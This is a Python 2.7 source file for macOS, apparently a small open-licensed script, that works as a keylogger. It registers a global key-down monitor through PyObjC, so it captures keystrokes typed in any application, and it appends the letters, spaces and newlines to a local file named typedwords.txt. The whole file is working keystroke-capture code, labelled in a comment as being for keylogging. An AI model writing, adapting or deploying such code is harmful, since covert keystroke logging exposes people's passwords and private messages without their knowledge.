#!/usr/local/bin/python2.7

# cocoa_keypress_monitor.py by Bjarte Johansen is licensed under a
# License: http://ljos.mit-license.org/

#For keylogging
from AppKit import NSApplication, NSApp
from Foundation import NSObject, NSLog
from Cocoa import NSEvent, NSKeyDownMask, NSApplication, NSApp
from PyObjCTools import AppHelper

import os

class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, notification):
        mask = NSKeyDownMask
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask, handler)

def handler(event):
    if os.path.isfile('typedwords.txt'):
        f = open('typedwords.txt','r+')
        dstr = f.read()
        dstrl= list(dstr)
        f.close()
    else:
    	f = open('typedwords.txt','w')
    	f.close()
    #print dstrl

    try:
        #NSLog(u"%@", event)
        #print event
        kc   = event.keyCode()
        keys = event.characters()
	keys = str(keys)

	if kc == 36:
		f = open("typedwords.txt","r+")
		keys = "\n"
		f.seek(0,2)
		f.write(keys)
		f.close()
	elif kc == 51:
		del(dstrl[len(dstrl)-1])
		dstr2 = "".join(dstrl)
		#f.seek(-1,2)
		#f.write(" ")
		#f.write("")
		f = open("typedwords.txt","w")
		f.write(dstr2)
		f.close()
	elif kc == 49:
		f = open("typedwords.txt","r+")
		keys = " "
		f.seek(0,2)
		f.write(keys)
		f.close()
	else:
		if keys.isalpha():
			f = open("typedwords.txt","r+")
			f.seek(0,2)
			f.write(keys)
			f.close()

    except KeyboardInterrupt:
	f.close()
        AppHelper.stopEventLoop()

def fetch_keys():
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    keys = NSApp().setDelegate_(delegate)
    
    AppHelper.runEventLoop()


if __name__ == '__main__':
	fetch_keys()
